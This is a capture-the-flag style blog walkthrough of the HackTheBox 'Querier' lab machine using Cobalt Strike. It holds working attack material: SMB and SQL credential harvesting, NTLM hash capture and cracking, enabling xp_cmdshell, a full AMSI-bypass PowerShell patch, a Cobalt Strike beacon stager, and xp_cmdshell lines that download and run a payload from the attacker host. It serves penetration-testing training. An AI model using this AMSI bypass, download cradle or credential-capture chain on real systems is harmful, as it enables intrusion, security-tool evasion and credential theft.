---
layout: post
title: Hackthebox Querier Walkthrough Using Cobalt Strike
categories: CobaltStrike
---

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-20/querier.png)

# Explanation
[Hackthebox](https://www.hackthebox.eu/) is a website which has a bunch of vulnerable machines in its own VPN.<br>
I've already done this `Querier` but this time I use [Cobalt Strike](https://www.cobaltstrike.com/) to solve the box.

# Solution
## 1. Initial Enumeration
#### TCP Port Scanning:
```shell
root@kali:~# nmap -p- 10.10.10.125 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 00:38 JST
Nmap scan report for 10.10.10.125
Host is up (0.24s latency).
Not shown: 65521 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-08-16T15:35:00
|_Not valid after:  2050-08-16T15:35:00
|_ssl-date: 2020-08-16T16:14:49+00:00; +5m19s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  winrm?
| fingerprint-strings:
|   JavaRMI:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html; charset=us-ascii
|     Server: Microsoft-HTTPAPI/2.0
|     Date: Sun, 16 Aug 2020 16:04:08 GMT
|     Connection: close
|     Content-Length: 326
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
|     <HTML><HEAD><TITLE>Bad Request</TITLE>
|     <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
|     <BODY><h2>Bad Request - Invalid Verb</h2>
|     <hr><p>HTTP Error 400. The request verb is invalid.</p>
|_    </BODY></HTML>
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port47001-TCP:V=7.80%I=7%D=8/17%Time=5F3957BB%P=x86_64-pc-linux-gnu%r(J
SF:avaRMI,1F9,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/html;\x20charset=us-ascii\r\nServer:\x20Microsoft-HTTPAPI/2\.0\r\nDate
SF::\x20Sun,\x2016\x20Aug\x202020\x2016:04:08\x20GMT\r\nConnection:\x20clo
SF:se\r\nContent-Length:\x20326\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-/
SF:/W3C//DTD\x20HTML\x204\.01//EN\"\"http://www\.w3\.org/TR/html4/strict\.
SF:dtd\">\r\n<HTML><HEAD><TITLE>Bad\x20Request</TITLE>\r\n<META\x20HTTP-EQ
SF:UIV=\"Content-Type\"\x20Content=\"text/html;\x20charset=us-ascii\"></HE
SF:AD>\r\n<BODY><h2>Bad\x20Request\x20-\x20Invalid\x20Verb</h2>\r\n<hr><p>
SF:HTTP\x20Error\x20400\.\x20The\x20request\x20verb\x20is\x20invalid\.</p>
SF:\r\n</BODY></HTML>\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5m18s, deviation: 0s, median: 5m17s
| ms-sql-info:
|   10.10.10.125:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-08-16T16:13:30
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1863.23 seconds
```

#### SMB Enumeration:
```shell
root@kali:~# smbclient -L 10.10.10.125
Enter WORKGROUP\root's password:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk
SMB1 disabled -- no workgroup available
```


## 2. Getting User

We can find out that there is a SMB share `Reports` on the target machine.<br>
Besides, we have read permission for that.
```
root@kali:~# smbclient //10.10.10.125/Reports
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jan 29 08:23:48 2019
  ..                                  D        0  Tue Jan 29 08:23:48 2019
  Currency Volume Report.xlsm         A    12229  Mon Jan 28 07:21:34 2019

		6469119 blocks of size 4096. 1614187 blocks available
```

```
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (11.6 KiloBytes/sec) (average 11.6 KiloBytes/sec)
```

```
root@kali:~# strings xl/* | grep Pwd
strings: Warning: 'xl/_rels' is a directory
strings: Warning: 'xl/theme' is a directory
strings: Warning: 'xl/worksheets' is a directory
Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
<;Pwd=
```


```
root@kali:~/impacket/examples# python mssqlclient.py -p 1433 reporting@10.10.10.125 -windows-auth
/usr/local/lib/python2.7/dist-packages/cryptography/__init__.py:39: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.
  CryptographyDeprecationWarning,
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     
SQL> 
```

```     
SQL> enable_ex_cmdshell
[-] ERROR(QUERIER): Line 1: Could not find stored procedure 'enable_ex_cmdshell'.
```

```shell
root@kali:~# responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.0.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.42]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']



[+] Listening for events...
```


```shell
msf5 > use auxiliary/admin/mssql/mssql_ntlm_stealer
msf5 auxiliary(admin/mssql/mssql_ntlm_stealer) > set password PcwTWTHRwryjc$c6
password => PcwTWTHRwryjc$c6
msf5 auxiliary(admin/mssql/mssql_ntlm_stealer) > set rhosts 10.10.10.125
rhosts => 10.10.10.125
msf5 auxiliary(admin/mssql/mssql_ntlm_stealer) > set username reporting
username => reporting
msf5 auxiliary(admin/mssql/mssql_ntlm_stealer) > set smbproxy 10.10.14.42
smbproxy => 10.10.14.42
msf5 auxiliary(admin/mssql/mssql_ntlm_stealer) > set use_windows_authent true
use_windows_authent => true
msf5 auxiliary(admin/mssql/mssql_ntlm_stealer) > run

[*] 10.10.10.125:1433     - DONT FORGET to run a SMB capture or relay module!
[*] 10.10.10.125:1433     - Forcing SQL Server at 10.10.10.125 to auth to 10.10.14.42 via xp_dirtree...
[+] 10.10.10.125:1433     - Successfully executed xp_dirtree on 10.10.10.125
[+] 10.10.10.125:1433     - Go check your SMB relay or capture module for goodies!
[*] 10.10.10.125:1433     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```shell
+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.10.10.125
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:da6da6826baa5108:23648F08BEC006B5FB5D1E08952C3DC7:0101000000000000C0653150DE09D20121AAC49B28B120F8000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000000D69F18E86E5097645CD78BB0BB23B83DD4CD6F4BA340739C0C321AB426CACB50A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0034003200000000000000000000000000
[*] Skipping previously captured hash for QUERIER\mssql-svc
```

```shell
root@kali:~# cat hash.txt 
mssql-svc::QUERIER:da6da6826baa5108:23648F08BEC006B5FB5D1E08952C3DC7:0101000000000000C0653150DE09D20121AAC49B28B120F8000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000000D69F18E86E5097645CD78BB0BB23B83DD4CD6F4BA340739C0C321AB426CACB50A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0034003200000000000000000000000000
```

```shell
root@kali:~# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)
1g 0:00:00:02 DONE (2020-08-17 13:50) 0.3355g/s 3007Kp/s 3007Kc/s 3007KC/s correforenz..coreyny11
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

```shell
root@kali:~/impacket/examples# mssqlclient.py -windows-auth mssql-svc@10.10.10.125
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> enable_xp_cmdshell
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> 
```

```shell
root@kali:~/cobaltstrike# ./teamserver 10.10.14.42 Password@123
[*] Will use existing X509 certificate and keystore (for SSL)
[+] Team server is up on 50050
[*] SHA256 hash of SSL cert is: af202d411ff19b73300a9766ebb57b8bbc0fe746767c74a14cb9d4b5e73c99d3
```

#### Connection
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-20/querier.png)

```powershell
$random = @"
using System;
using System.Runtime.InteropServices;

public class randomname {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $random

$LoadLibrary = [randomname]::LoadLibrary("am" + "si.dll")
$Address = [randomname]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[randomname]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

```powershell
root@kali:~# head beacon.ps1 -n 40
$random = @"
using System;
using System.Runtime.InteropServices;

public class randomname {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $random

$LoadLibrary = [randomname]::LoadLibrary("am" + "si.dll")
$Address = [randomname]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[randomname]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)

Set-StrictMode -Version 2

function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
```

```shell
SQL> xp_cmdshell "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://10.10.14.42:80/a'))"
[-] ERROR(QUERIER): Line 1: Incorrect syntax near '/'.
```

```shell
SQL> xp_cmdshell “powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\”http://10.10.14.42:80/a\"))"
[-] ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

To bypass the Antimalware Scan Interface(AMSI), we can use [AmsiScanBufferBypass](https://github.com/rasta-mouse/AmsiScanBufferBypass) from Rasta Mouse.

